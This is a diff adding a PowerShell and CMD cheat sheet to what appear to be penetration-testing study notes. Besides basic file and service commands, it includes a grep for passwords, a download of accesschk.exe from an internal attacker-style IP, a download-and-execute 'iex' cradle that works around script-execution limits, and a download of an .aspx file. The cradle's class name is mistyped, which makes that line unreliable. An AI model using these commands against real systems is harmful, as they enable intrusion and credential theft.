@@ -159,4 +159,64 @@ $RemoteScriptBlock = {
   - -Examples
     - against local computer or two remote computers, etc.
    
+===================
+# Commands
+## in powershell
+```
+ls -Force : hidden file
+```
+
+```
+- head  
+cat -First 5 username.txt
+Get-Service | select -First 10
+```
+
+```
+Get-Service | Where-Object {$_.name -eq "ALG"}
+```
+
+- grep
+```
+| Select-String passw
+or
+| Select-String -Pattern 'passw'
+
+
+get-service | Where-Object {$_.Name -match "abyss"} 
+: contains abyss 
+get-service | Where-Object {$_.Name -notmatch "abyss"}
+: exclude
+```
+
+- wget
+```
+wget(alias : invoke-webrequest) http://10.8.0.129/accesschk.exe -OutFile C:\Users\minseok.kim\Documents\accesschk.exe
+  -outfile : need to put full path 
+```
+
+- tree
+```
+tree /F
+```
+
+
+## CMD
+```
+dir /s FILENAME : search file
+```
+
+
+![alt text](image-12.png)
+- if you're not allowed execute .\.ps1 directly(error), download from internet and execute with invoke expression with `-nop`  
+```powershell
+powershell -nop -c "iex(new-object new.webclient).Downloadstring('http://')"
+-nop : no load profile
+```
+
+ 
+- cmd can't execute wget, so load powershell first
+```
+powershell wget http:// -outfile .\test.aspx
+```
 
